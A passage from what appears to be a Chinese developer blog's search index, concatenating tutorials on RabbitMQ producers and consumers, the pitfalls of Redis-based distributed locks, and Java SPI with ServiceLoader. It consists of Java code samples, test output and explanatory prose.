ChannelAwareMessageListener topicConsumer() { return new BasicConsumer(\"topic\"); } @Bean(name = \"topicMessageListenerContainer\") public MessageListenerContainer messageListenerContainer() { SimpleMessageListenerContainer container = new SimpleMessageListenerContainer(); container.setConnectionFactory(connectionFactory); container.setRabbitAdmin(rabbitAdmin); container.setQueues(topicQueue()); container.setPrefetchCount(20); container.setAcknowledgeMode(AcknowledgeMode.AUTO); container.setMessageListener(topicConsumer()); return container; }} 对应的测试case 12345678910@Testpublic void testTopicConsumer() throws InterruptedException { String[] routingKey = new String[]{\"d.queue\", \"a.queue\", \"cqueue\"}; for (int i = 0; i &lt; 20; i++) { amqpProducer.publishMsg(\"topic.exchange\", routingKey[i % 3], \"&gt;&gt;&gt; hello \" + routingKey[i % 3] + \"&gt;&gt;&gt; \" + i); } System.out.println(\"-------over---------\"); Thread.sleep(1000 * 60 * 10);} 广播方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@Configurationpublic class FanoutConsumerConfig { @Autowired private ConnectionFactory connectionFactory; @Autowired private RabbitAdmin rabbitAdmin; @Bean public FanoutExchange fanoutExchange() { FanoutExchange fanoutExchange = new FanoutExchange(\"fanout.exchange\"); fanoutExchange.setAdminsThatShouldDeclare(rabbitAdmin); return fanoutExchange; } @Bean public Queue fanoutQueue() { Queue queue = new Queue(\"ccc\"); queue.setAdminsThatShouldDeclare(rabbitAdmin); return queue; } @Bean public Binding fanoutQueueBinding() { Binding binding = BindingBuilder.bind(fanoutQueue()).to(fanoutExchange()); binding.setAdminsThatShouldDeclare(rabbitAdmin); return binding; } @Bean public ChannelAwareMessageListener fanoutConsumer() { return new BasicConsumer(\"fanout\"); } @Bean(name = \"FanoutMessageListenerContainer\") public MessageListenerContainer messageListenerContainer() { SimpleMessageListenerContainer container = new SimpleMessageListenerContainer(); container.setConnectionFactory(connectionFactory); container.setRabbitAdmin(rabbitAdmin); container.setQueues(fanoutQueue()); container.setPrefetchCount(20); container.setAcknowledgeMode(AcknowledgeMode.AUTO); container.setMessageListener(fanoutConsumer()); return container; }} 对应的测试case 1234567891011@Testpublic void testFanoutConsumer() throws InterruptedException { String[] routingKey = new String[]{\"d.queue\", \"a.queue\", \"cqueue\", \"hello.world\", \"world\", \"test1\"}; for (int i = 0; i &lt; 20; i++) { amqpProducer .publishMsg(\"fanout.exchange\", routingKey[i % 6], \"&gt;&gt;&gt; hello \" + routingKey[i % 6] + \"&gt;&gt;&gt; \" + i); } System.out.println(\"-------over---------\"); Thread.sleep(1000 * 60 * 10);} II. 其他项目地址 六月/study-demo 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/05/31/RabbitMQ基础教程之Spring-JavaConfig使用篇/"},{"title":"RabbitMQ基础教程之使用进阶篇","text":"RabbitMQ基础教程之使用进阶篇相关博文，推荐查看: RabbitMq基础教程之安装与测试 RabbitMq基础教程之基本概念 RabbitMQ基础教程之基本使用篇 I. 背景前一篇基本使用篇的博文中，介绍了rabbitmq的三种使用姿势，可以知道如何向RabbitMQ发送消息以及如何消费，但遗留下几个疑问，本篇则主要希望弄清楚这几点 Exchange声明的问题（是否必须声明，如果不声明会怎样） Exchange声明的几个参数（durable, autoDelete)有啥区别 当没有队列和Exchange绑定时，直接往队列中塞数据，好像不会有数据增加（即先塞数据，然后创建queue，建立绑定，从控制台上看这个queue里面也不会有数据） 消息消费的两种姿势（一个主动去拿数据，一个是rabbit推数据）对比 II. 基本进阶篇1. Exchange默认场景将前面的消息发送代码捞出来，干掉Exchange的声明，如下 123456789101112131415161718192021222324public class DefaultProducer { public static void publishMsg(String queue, String message) throws IOException, TimeoutException { ConnectionFactory factory = RabbitUtil.getConnectionFactory(); //创建连接 Connection connection = factory.newConnection(); //创建消息通道 Channel channel = connection.createChannel(); channel.queueDeclare(queue, true, false, true, null); // 发布消息 channel.basicPublish(\"\", queue, null, message.getBytes()); channel.close(); connection.close(); } public static void main(String[] args) throws IOException, TimeoutException { for (int i = 0; i &lt; 20; i++) { publishMsg(\"hello\", \"msg\" + i); } }} 在发布消息时，传入的Exchange名为“”，再到控制台查看，发现数据被投递到了(AMQP default)这个交换器，对应的截图如下 看一下上面的绑定描述内容，重点如下 默认交换器选择Direct策略 将rountingKey绑定到同名的queue上 不支持显示的绑定和解绑 上面的代码为了演示数据的流向，在发布消息的同时也定义了一个同名的Queue，因此可以在控制台上看到同名的 “hello” queue，且内部有20条数据 当我们去掉queue的声明时，会发现另一个问题，投入的数据好像并没有存下来（因为没有queue来接收这些数据，而之后再声明queue时，之前的数据也不会分配过来） 2. 绑定之后才有数据首先是将控制台中的hello这个queue删掉，然后再次执行下面的代码(相对于前面的就是注释了queue的声明） 123456789101112131415161718192021222324public class DefaultProducer { public static void publishMsg(String queue, String message) throws IOException, TimeoutException { ConnectionFactory factory = RabbitUtil.getConnectionFactory(); //创建连接 Connection connection = factory.newConnection(); //创建消息通道 Channel channel = connection.createChannel(); // channel.queueDeclare(queue, true, false, true, null); // 发布消息 channel.basicPublish(\"\", queue, null, message.getBytes()); channel.close(); connection.close(); } public static void main(String[] args) throws IOException, TimeoutException { for (int i = 0; i &lt; 20; i++) { publishMsg(\"hello\", \"msg\" + i); } }} 然后从控制台上看，可以看到有数据写入Exchange，但是没有queue来接收这些数据 然后开启消费进程，然后再次执行上面的塞入数据，新后面重新塞入的数据可以被消费；但是之前塞入的数据则没有，消费消息的代码如下: 12345678910111213141516171819202122232425262728293031323334public class MyDefaultConsumer { public void consumerMsg(String queue) throws IOException, TimeoutException { ConnectionFactory factory = RabbitUtil.getConnectionFactory(); //创建连接 Connection connection = factory.newConnection(); //创建消息通道 Channel channel = connection.createChannel(); channel.queueDeclare(queue, true, false, true, null); Consumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String message = new String(body, \"UTF-8\"); try { System.out.println(\" [ \" + queue + \" ] Received '\" + message); } finally { channel.basicAck(envelope.getDeliveryTag(), false); } } }; // 取消自动ack channel.basicConsume(queue, false, consumer); } public static void main(String[] args) throws IOException, TimeoutException, InterruptedException { MyDefaultConsumer consumer = new MyDefaultConsumer(); consumer.consumerMsg(\"hello\"); Thread.sleep(1000 * 60 * 10); }} 小结： 通过上面的演示得知一点 当没有Queue绑定到Exchange时，往Exchange中写入的消息也不会重新分发到之后绑定的queue上 3. Durable, autoDeleted参数在定义Queue时，可以指定这两个参数，这两个参数的区别是什么呢？ a. durable持久化，保证RabbitMQ在退出或者crash等异常情况下数据没有丢失，需要将queue，exchange和Message都持久化。 若是将queue的持久化标识durable设置为true,则代表是一个持久的队列，那么在服务重启之后，也会存在，因为服务会把持久化的queue存放在硬盘上，当服务重启的时候，会重新什么之前被持久化的queue。队列是可以被持久化，但是里面的消息是否为持久化那还要看消息的持久化设置。也就是说，重启之前那个queue里面还没有发出去的消息的话，重启之后那队列里面是不是还存在原来的消息，这个就要取决于发生着在发送消息时对消息的设置 b. autoDeleted自动删除，如果该队列没有任何订阅的消费者的话，该队列会被自动删除。这种队列适用于临时队列 这个比较容易演示了，当一个Queue被设置为自动删除时，当消费者断掉之后，queue会被删除，这个主要针对的是一些不是特别重要的数据，不希望出现消息积累的情况 123// 倒数第二个参数，true表示开启自动删除// 正数第二个参数，true表示持久化channel.queueDeclare(queue, true, false, true, null); c. 小结 当一个Queue已经声明好了之后，不能更新durable或者autoDelted值；当需要修改时，需要先删除再重新声明 消费的Queue声明应该和投递的Queue声明的 durable,autoDelted属性一致，否则会报错 对于重要的数据，一般设置 durable=true, autoDeleted=false 对于设置 autoDeleted=true 的队列，当没有消费者之后，队列会自动被删除 4. ACK执行一个任务可能需要花费几秒钟，你可能会担心如果一个消费者在执行任务过程中挂掉了。一旦RabbitMQ将消息分发给了消费者，就会从内存中删除。在这种情况下，如果正在执行任务的消费者宕机，会丢失正在处理的消息和分发给这个消费者但尚未处理的消息。但是，我们不想丢失任何任务，如果有一个消费者挂掉了，那么我们应该将分发给它的任务交付给另一个消费者去处理。 为了确保消息不会丢失，RabbitMQ支持消息应答。消费者发送一个消息应答，告诉RabbitMQ这个消息已经接收并且处理完毕了。RabbitMQ就可以删除它了。 因此手动ACK的常见手段 1234567891011121314151617// 接收消息之后，主动ack/nakConsumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String message = new String(body, \"UTF-8\"); try { System.out.println(\" [ \" + queue + \" ] Received '\" + message); channel.basicAck(envelope.getDeliveryTag(), false); } catch (Exception e) { channel.basicNack(envelope.getDeliveryTag(), false, true); } }};// 取消自动ackchannel.basicConsume(queue, false, consumer); 手动ack时，有个multiple，其含义表示: 可以理解为每个Channel维护一个unconfirm的消息序号集合，每publish一条数据，集合中元素加1，每回调一次handleAck方法，unconfirm集合删掉相应的一条(multiple=false)或多条(multiple=true)记录 III. 其他1. 参考Java Client API Guide 2. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 3. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 4. 扫描关注","link":"/hexblog/2018/05/29/RabbitMQ基础教程之使用进阶篇/"},{"title":"Redis实现分布式锁相关注意事项","text":"Redis实现分布式锁相关注意事项 查看了不少关于redis实现分布式锁的文章，无疑要设计一个靠谱的分布式并不太容易，总会出现各种鬼畜的问题；现在就来小述一下，在设计一个分布式锁的过程中，会遇到一些什么问题 I. 背景知识借助redis来实现分布式锁（我们先考虑单机redis的模式），首先有必要了解下以下几点： 单线程模式 setnx : 当不存在时，设置value，并返回1； 否则返回0 getset : 设置并获取原来的值 expire : 设置失效时间 get : 获取对应的值 del : 删除 ttl : 获取key对应的剩余时间，若key没有设置过超时时间，或者压根没有这个key则返回负数（可能是-1，-2） watch/unwatch : 事务相关 II. 方案设计1. 设计思路获取锁： 调用 setnx 尝试获取锁，如果设置成功，表示获取到了锁 设置失败，此时需要判断锁是否过期 未过期，则表示获取失败；循环等待，并再次尝试获取锁 已过期，getset再次设置锁，判断是否获取了锁（根据返回的值进行判断，后面给出具体的方案） 若失败，则重新进入获取锁的逻辑 释放锁： 一个原则就是确保每个业务方释放的是自己的锁 2. getset的实现方案网上一种常见的case，主要思路如下 setnx 尝试获取锁 失败，则 get 获取锁的value （一般是 uuid_timstamp） 判断是否过期，若没有过期，则表示真的获取失败 若过期，则采用 getset设置，尝试获取锁 实现代码如下 12345678910111213141516171819202122232425262728293031323334353637383940public class DistributeLock { private static final Long OUT_TIME = 30L; public String tryLock(Jedis jedis, String key) { while (true) { String value = UUID.randomUUID().toString() + \"_\" + System.currentTimeMillis(); Long ans = jedis.setnx(key, value); if (ans != null &amp;&amp; ans == 1) { // 获取锁成功 return value; } // 锁获取失败, 判断是否超时 String oldLock = jedis.get(key); if (oldLock == null) { continue; } long oldTime = Long.parseLong(oldLock.substring(oldLock.lastIndexOf(\"_\") + 1)); long now = System.currentTimeMillis(); if (now - oldTime &lt; OUT_TIME) { // 没有超时 continue; } String getsetOldVal = jedis.getSet(key, value); if (Objects.equals(oldLock, getsetOldVal)) { // 返回的正好是上次的值，表示锁获取成功 return value; } else { // 表示返回的是其他业务设置的锁，赶紧的设置回去 jedis.set(key, getsetOldVal); } } } public void tryUnLock(Jedis jedis, String key, String uuid) { String ov = jedis.get(key); if (uuid.equals(ov)) { // 只释放自己的锁 jedis.del(key); } }} 观察获取锁的逻辑，特别是获取超时锁的逻辑，很容易想到有一个问题 getSet 方法会不会导致写数据混乱的问题，简单来说就是多个线程同时判断锁超时时，执行 getSet设置锁时，最终获取锁的线程，能否保证和redis中的锁的value相同 上面的实现方式，一个混乱的case如下: 三个线程a,b,c 都进入到了锁超时的阶段 线程a, 获取原始值 oldVal, 并设置 t1 线程b, 获取线程a设置的 t1, 并重设为 t2 线程c, 获取线程b设置的 t2, 并重设为 t3 线程a，判断，并正式获取到锁 线程b，判断失败，恢复原来锁的内容为t1 线程c, 判断失败，恢复原来锁的内容为t2 问题出现了，获取锁的线程a，期望所得内容为t1, 但是实际为t2; 导致无法释放锁 实际验证 在上面的代码中，配合测试case，加上一些日志输出 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public static String tryLock(Jedis jedis, String key) throws InterruptedException { String threadName = Thread.currentThread().getName(); while (true) { String value = threadName + \"_\" + UUID.randomUUID().toString() + \"_\" + System.currentTimeMillis(); Long ans = jedis.setnx(key, value); if (ans != null &amp;&amp; ans == 1) { // 获取锁成功 return value; } // 锁获取失败, 判断是否超时 String oldLock = jedis.get(key); if (oldLock == null) { continue; } long oldTime = Long.parseLong(oldLock.substring(oldLock.lastIndexOf(\"_\") + 1)); long now = System.currentTimeMillis(); if (now - oldTime &lt; OUT_TIME) { // 没有超时 continue; } // 强制使所有的线程都可以到这一步 Thread.sleep(50); System.out.println(threadName + \" in getSet!\"); // 人工接入，确保t1 获取到锁， t2 获取的是t1设置的内容， t3获取的是t2设置的内容 if (\"t2\".equalsIgnoreCase(threadName)) { Thread.sleep(20); } else if (\"t3\".equalsIgnoreCase(threadName)) { Thread.sleep(40); } String getsetOldVal = jedis.getSet(key, value); System.out.println(threadName + \" set redis value: \" + value); if (Objects.equals(oldLock, getsetOldVal)) { // 返回的正好是上次的值，表示锁获取成功 System.out.println(threadName + \" get lock!\"); if (\"t1\".equalsIgnoreCase(threadName)) { // t1获取到锁，强制sleep40ms， 确保线t2,t3也进入了 getSet逻辑 Thread.sleep(40); } return value; } else { // 表示返回的是其他业务设置的锁，赶紧的设置回去 // 人肉介入，确保t2优先执行，并设置回t1设置的值, t3后执行设置的是t2设置的值 if (\"t3\".equalsIgnoreCase(threadName)) { Thread.sleep(40); } else if (\"t2\".equalsIgnoreCase(threadName)){ Thread.sleep(20); } jedis.set(key, getsetOldVal); System.out.println(threadName + \" recover redis value: \" + getsetOldVal); } }} 测试case 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@Testpublic void testLock() throws InterruptedException { // 先无视获取jedis的方式 JedisPool jedisPool = cacheWrapper.getJedisPool(0); Jedis jedis = jedisPool.getResource(); String lockKey = \"lock_test\"; String old = DistributeLock.tryLock(jedis, lockKey); System.out.println(\"old lock: \" + old); // 确保锁超时 Thread.sleep(40); // 创建三个线程 Thread t1 = new Thread(() -&gt; { try { Jedis j =jedisPool.getResource(); DistributeLock.tryLock(j, lockKey); System.out.println(\"t1 &gt;&gt;&gt;&gt; \" + j.get(lockKey)); } catch (InterruptedException e) { e.printStackTrace(); } }, \"t1\"); Thread t2 = new Thread(() -&gt; { try { Jedis j =jedisPool.getResource(); DistributeLock.tryLock(j, lockKey); System.out.println(\"t2 &gt;&gt;&gt;&gt;&gt; \" + j.get(lockKey)); } catch (InterruptedException e) { e.printStackTrace(); } }, \"t2\"); Thread t3 = new Thread(() -&gt; { try { Jedis j =jedisPool.getResource(); DistributeLock.tryLock(j, lockKey); System.out.println(\"t3 &gt;&gt;&gt;&gt;&gt; \" + j.get(lockKey)); } catch (InterruptedException e) { e.printStackTrace(); } }, \"t3\"); t1.start(); t2.start(); t3.start(); Thread.sleep(10000);}; 部分输出结果: 1234567891011121314main in getSet!main set redis value: main_d4cc5d69-5027-4550-abe1-10126f057779_1515643763130main get lock!old lock: main_d4cc5d69-5027-4550-abe1-10126f057779_1515643763130t1 in getSet!t2 in getSet!t1 set redis value: t1_105974db-7d89-48bf-9669-6f122a3f9fb6_1515643763341t1 get lock!t3 in getSet!t2 set redis value: t2_be06f80a-9b70-4a0e-a86d-44337abe8642_1515643763341t1 &gt;&gt;&gt;&gt; t2_be06f80a-9b70-4a0e-a86d-44337abe8642_1515643763341t3 set redis value: t3_9aa5d755-43b2-43bd-9a0b-2bad13fa31f6_1515643763345t2 recover redis value: t1_105974db-7d89-48bf-9669-6f122a3f9fb6_1515643763341t3 recover redis value: t2_be06f80a-9b70-4a0e-a86d-44337abe8642_1515643763341 重点关注 t1 &gt;&gt;&gt;&gt; t2_be06f80a-9b70-4a0e-a86d-44337abe8642_1515643763341，表示t1线程过去了锁，但是锁的内容不是其value，即便t2去恢复，也会被t3给覆盖 如何解决上面这个问题呢？ 上面是典型的并发导致的问题，当然可以考虑从解决并发问题的角度出发来考虑，一个常见的方式就是加锁了，思路如下：（不详细展开了） 在判断超时之后，加锁 再次获取对应的值，判断是否超时，是则执行上面的操作 否则退出逻辑，继续循环 这种实现方式，会有以下的问题： getset 这个方法执行，可能导致写入脏数据 基于服务器时钟进行超时判断，要求所有服务器始终一致，否则有坑 3. expire实现方式相比于前面一种直接将value设置为时间戳，然后来比对的方法，这里则直接借助redis本身的expire方式来实现超时设置，主要实现逻辑相差无几 123456789101112131415161718192021222324252627282930313233public class DistributeExpireLock { private static final Integer OUT_TIME = 3; public static String tryLock(Jedis jedis, String key) { String value = UUID.randomUUID().toString(); while(true) { Long ans = jedis.setnx(key, value); if (ans != null &amp;&amp; ans == 1) { // 获取锁成功 jedis.expire(key, OUT_TIME); // 主动设置超时时间为3s return value; } // 获取失败，先确认下是否有设置国超是时间 // 防止锁的超时时间设置失效，导致一直竞争不到 if(jedis.ttl(key) &lt; 0) { jedis.expire(key, OUT_TIME); } } } public static void tryUnLock(Jedis jedis, String key, String uuid) { String ov = jedis.get(key); if (uuid.equals(ov)) { // 只释放自己的锁 jedis.del(key); System.out.println(Thread.currentThread() +\" del lock success!\"); } else { System.out.println(Thread.currentThread() +\" del lock fail!\"); } }} 获取锁的逻辑相比之前的，就简单很多了，接下来则需要简单的分析下，上面这种实现方式，会不会有坑呢？我们主要看一下获取锁失败的场景 如果获取锁失败 表示有其他的业务方已经获取到了锁 此时，只能等持有锁的业务方主动释放锁 判断锁是否设置了超时时间，若没有则加一个（防止设置超时时间失败导致问题） 从上面这个逻辑来看问题不大，但是有个问题，case ： 如某个业务方setnx获取到了锁，但是因为网络问题，过了很久才获取到返回，此时锁已经失效并被其他业务方获取到了，就会出现多个业务方同时持有锁的场景 III. 小结说明想基于redis实现一个相对靠谱的分布式锁，需要考虑的东西还是比较多的，而且这种锁并不太适用于业务要求特别严格的地方，如 一个线程持有锁时，如果发生gc，导致锁超时失效，但是自己又不知道，此时就会出现多个业务方同时持有锁的场景 对于锁超时的场景，需要仔细考虑，是否会出现并发问题 确保只能释放自己的锁（以防止释放了别人的锁，出现问题） 参考链接 基于Redis的分布式锁到底安全吗? 利用redis实现的分布式锁 V. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/14/Redis实现分布式锁相关注意事项/"},{"title":"1. SPI框架实现之旅一：背景介绍","text":"背景介绍 SPI的全名为Service Provider Interface，简单的总结下java spi机制的思想。我们系统里抽象的各个模块，往往有很多不同的实现方案，比如日志模块的方案，xml解析模块、jdbc模块的方案等。面向的对象的设计里，我们一般推荐模块之间基于接口编程，模块之间不对实现类进行硬编码。一旦代码里涉及具体的实现类，就违反了可拔插的原则，如果需要替换一种实现，就需要修改代码。为了实现在模块装配的时候能不在程序里动态指明，这就需要一种服务发现机制。 java spi就是提供这样的一个机制：为某个接口寻找服务实现的机制 1. 背景上面摘抄了一下spi的概念，接着以个人的理解，简单的谈一下为什么会用到SPI， 什么场景下可以用到这个， 以及使用了SPI机制后有什么优越性 什么是SPI虽然最开始就引用了spi的解释，这里浅谈一下个人理解。Service Provider Interface 以接口方式提供服务， 和API不同，spi的机制是定义一套标准规范的接口，实现交给其他人来做。 所以一个接口，可以有很多的实现，你完全可以根据自己的需要去选择具体的实现方式，因为是面向接口的开发，所以你的业务代码基本上就不用修改，就可以切到另一个实现了 什么场景可以用 分别从框架层面和业务层面，给出一个我认为比较合适的场景 1. 日志输出 SLF4jSLF4j：大名鼎鼎的日志输出接口，这个jar包里面提供的都只是接口方式，具体的实现需要自己去实现，当然比较常用的 logback 就是一个具体的实现包了， 在项目中使用 slf4j 的api进行日志的输出， 通过简单的配置，引入logback， 就可以使用logback来实现具体的日志输出； 也可以换一个日志实现 commons-logging，业务上不需要任何的改动，就可以用不同的实现来输出日志 2. 业务场景假设你现在有个用户注册成功后的欢迎用户的业务，不同渠道（微信，qq，微博等）注册的，显示的欢迎不同，对此有两种不同的实现方式 如果每个不同的渠道进来的，都有一个独立的应用来响应 （因为绝大多数的业务都一样，可能就欢迎词不同，如果做到代码最大程度的复用） 只有一个应用，来处理所有的这些场景 可以怎么用 结合上面的业务场景，来描述下可以怎么用 1. 代码复用为了实现代码最大程度的复用，那么可以将不同的地方，抽象成一个SPI接口，在业务层通过接口来代替具体的实现类实现业务逻辑； 每个渠道，都有个独立的应用，那么在微信渠道，创建一个 WeixinSpiImpl来实现接口 在qq渠道，实现 QQSpiImpl；那么在具体的接口调用处，实际上就是执行的spi实现类方法 2. 业务场景的选择区分这个与上面不同，同一个服务接口，根据不同的业务场景，选择不同的实现来执行；当然你是完全可以使用 if， else来实现这种场景，唯一的问题就是扩展比较麻烦； 这种场景下，我们希望的就是这个接口，能自动的根据业务场景，来选择最合适的实现类来执行 简单来讲，就是\u0010spi接口执行之前，其实需要有一个自动选择匹配的实现类的前置过程； 通常这种业务场景下，具体的spi实现会有多个，但是需要有一个选择的策略 2. 小目标 在具体的实现之前，先定义一个小目标，我们想要实现一个什么样子的东西出来 通过上面的背景描述，我们的小目标也就很明确了，我们的实现至少需要满足两个场景 静态选择SPI实现， 即在选择完成之后，所有对这个spi接口的引用都是确定由这个实现来承包 动态选择SPI实现， 不到运行之时，你都不知道会是哪个spi实现来干这件事 3. 技术储备 java本身就提供了一套spi的支持方式: ServiceLoader，我们后续的开发，也会在这个基础之上进行 利用java的 ServiceLoader 找到服务接口的实现类，有一些约定，下面给出要求说明和一个测试case 一般实现流程 定义spi接口 ： IXxx 具体的实现类: AXxx, BXxx 在jar包的META-INF/services/目录下新建一个文件，命名为 spi接口的完整类名，内容为spi接口实现的完整类名，一个实现类占一行 测试case如下 spi接口 com.hust.hui.quicksilver.commons.spi.HelloInterface 12345678910package com.hust.hui.quicksilver.commons.spi;/** * Created by yihui on 2017/3/17. */public interface HelloInterface { void sayHello();} spi接口的两个实现类 com.hust.hui.quicksilver.commons.spi.impl.ImageHello.java 12345678910111213package com.hust.hui.quicksilver.commons.spi.impl;import com.hust.hui.quicksilver.commons.spi.HelloInterface;/** * Created by yihui on 2017/3/17. */public class ImageHello implements HelloInterface { @Override public void sayHello() { System.out.println(\"image hello!\"); }} com.hust.hui.quicksilver.commons.spi.impl.TextHello.java 12345678910111213package com.hust.hui.quicksilver.commons.spi.impl;import com.hust.hui.quicksilver.commons.spi.HelloInterface;/** * Created by yihui on 2017/3/17. */public class TextHello implements HelloInterface { @Override public void sayHello() { System.out.println(\"text hello\"); }} 配置文件 com.hust.hui.quicksilver.commons.spi.HelloInterface 12com.hust.hui.quicksilver.commons.spi.impl.ImageHellocom.hust.hui.quicksilver.commons.spi.impl.TextHello 测试类 1234567891011public class HelloSpiTest { @Test public void testSPI() { ServiceLoader&lt;HelloInterface&gt; serviceLoader = ServiceLoader.load(HelloInterface.class); for (HelloInterface hello: serviceLoader) { hello.sayHello(); } }} 输出如下: 12image hello!text hello 测试类演示如下图: 4. 设计思路画了一下结构图，方便理解, 下面的核心是 SpiLoader 类， 负责加载spi接口的所有实现类， 初始化所有定义的选择器， 返回一个spi接口的实现类初始化用户自定义的spi对象，然后用户持有此对象调用spi接口中提供的方法即可 5. 其他博客系列链接： SPI框架实现之旅四：使用测试 SPI框架实现之旅三：实现说明 SPI框架实现之旅二：整体设计 SPI框架实现之旅一：背景介绍 项目: QuickAlarm 项目地址： Quick-SPI 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2017/05/26/SPI框架实现之旅一：背景介绍/"},{"title":"RabbitMQ基础教程之基本使用篇","text":"RabbitMQ基础教程之基本使用篇最近因为工作原因使用到RabbitMQ，之前也接触过其他的mq消息中间件，从实际使用感觉来看，却不太一样，正好趁着周末，可以好好看一下RabbitMQ的相关知识点；希望可以通过一些学习，可以搞清楚以下几点 基础环境搭建 可以怎么使用 实现原理是怎样的 实际工程中的使用（比如结合SpringBoot可以怎么玩） 相关博文，欢迎查看： 《RabbitMq基础教程之安装与测试》 《RabbitMq基础教程之基本概念》 I. 前提准备在开始之前，先得搭建基本的环境，因为个人主要是mac进行的开发，所有写了一篇mac上如何安装rabbitmq的教程，可以通过 《mac下安装和测试rabbitmq》 查看 1. Centos安装过程下面简单说一下Linux系统下，可以如何安装 Centos 系统： 1234567# 安装erlangrpm -Uvh http://download.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-8.noarch.rpmyum install erlang# 安装RabbitMQwget http://www.rabbitmq.com/releases/rabbitmq-server/v3.6.6/rabbitmq-server-3.6.6-1.el7.noarch.rpmyum install rabbitmq-server-3.6.6-1.el7.noarch.rpm 启动和查看的命令 1234# 完成后启动服务：service rabbitmq-server start# 可以查看服务状态：service rabbitmq-server status 2. 注意 安装完毕之后，可以开启控制台，主要就是 rabbitmq-plugins enable rabbitmq_management, 默认的端口号为15672 默认分配的用户/密码为: guest/guest， 只允许本地访问；如果跨应用读写数据时，请添加账号和设置对应的权限（推荐参考上面mac安装的博文，里面有介绍） II. 基本使用篇直接使用amqp-client客户端做基本的数据读写，先不考虑Spring容器的场景，我们可以怎样进行塞数据，然后又怎样可以从里面获取数据； 在实际使用之前，有必要了解一下RabbitMQ的几个基本概念，即什么是Queue,Exchange,Binding，关于这些基本概念，可以参考博文： 《RabbitMq基础教程之基本概念》 1. 基本使用姿势首先是建立连接，一般需要设置服务器的IP，端口号，用户名密码之类的，公共代码如下 12345678910111213public class RabbitUtil { public static ConnectionFactory getConnectionFactory() { //创建连接工程，下面给出的是默认的case ConnectionFactory factory = new ConnectionFactory(); factory.setHost(\"127.0.0.1\"); factory.setPort(5672); factory.setUsername(\"admin\"); factory.setPassword(\"admin\"); factory.setVirtualHost(\"/\"); return factory; }} a. 生产者要使用，基本的就需要一个消息投递和一个消息消费两方，线看消息生产者的一般写法 123456789101112131415161718192021public class MsgProducer { public static void publishMsg(String exchange, BuiltinExchangeType exchangeType, String toutingKey, String message) throws IOException, TimeoutException { ConnectionFactory factory = RabbitUtil.getConnectionFactory(); //创建连接 Connection connection = factory.newConnection(); //创建消息通道 Channel channel = connection.createChannel(); // 声明exchange中的消息为可持久化，不自动删除 channel.exchangeDeclare(exchange, exchangeType, true, false, null); // 发布消息 channel.basicPublish(exchange, toutingKey, null, message.getBytes()); channel.close(); connection.close(); }} 针对上面的代码，结合RabbitMQ的基本概念进行分析 不管是干啥，第一步都是获取连接，也就是上面的Connection 从《RabbitMq基础教程之基本概念》直到，生产者消费者都是借助Channel与Exchange或者Queue打交道，接下来就是通过Connection创建数据流通信道Channel Channel准备完毕之后，生产者就可以向其中投递数据 投递完毕之后，回收现场资源 疑问： 在声明Exchange时，是否就需要选择消息绑定策略？ 不声明时，默认是什么策略？ b. 消费者结合上面的代码和分析，大胆的预测下消费者的流程 获取连接Connection 创建Channel 将Channel与Queue进行绑定 创建一个Consumer，从Queue中获取数据 消息消费之后，ack 下面给出一个mq推数据的消费过程 123456789101112131415161718192021222324252627282930313233343536public class MsgConsumer { public static void consumerMsg(String exchange, String queue, String routingKey) throws IOException, TimeoutException { ConnectionFactory factory = RabbitUtil.getConnectionFactory(); //创建连接 Connection connection = factory.newConnection(); //创建消息信道 final Channel channel = connection.createChannel(); //消息队列 channel.queueDeclare(queue, true, false, false, null); //绑定队列到交换机 channel.queueBind(queue, exchange, routingKey); System.out.println(\"[*] Waiting for message. To exist press CTRL+C\"); Consumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String message = new String(body, \"UTF-8\"); try { System.out.println(\" [x] Received '\" + message); } finally { System.out.println(\" [x] Done\"); channel.basicAck(envelope.getDeliveryTag(), false); } } }; // 取消自动ack channel.basicConsume(queue, false, consumer); }} 2. Direct方式a. Producer直接在前面的基础上进行测试，我们定义一个新的exchange名为direct.exchange，并且制定ExchangeType为直接路由方式 （先不管这种写法的合理性） 123456789101112131415161718192021222324public class DirectProducer { private static final String EXCHANGE_NAME = \"direct.exchange\"; public void publishMsg(String routingKey, String msg) { try { MsgProducer.publishMsg(EXCHANGE_NAME, BuiltinExchangeType.DIRECT, routingKey, msg); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] args) { DirectProducer directProducer = new DirectProducer(); String[] routingKey = new String[]{\"aaa\", \"bbb\"}; String msg = \"hello &gt;&gt;&gt; \"; for (int i = 0; i &lt; 30; i++) { directProducer.publishMsg(routingKey[i % 2], msg + i); } System.out.println(\"----over-------\"); }} 上面的代码执行一遍之后，看控制台会发现新增了一个Exchange b. consumer同样的我们写一下对应的消费者，一个用来消费aaa,一个消费bbb 12345678910111213141516171819202122232425262728public class DirectConsumer { private static final String exchangeName = \"direct.exchange\"; public void msgConsumer(String queueName, String routingKey) { try { 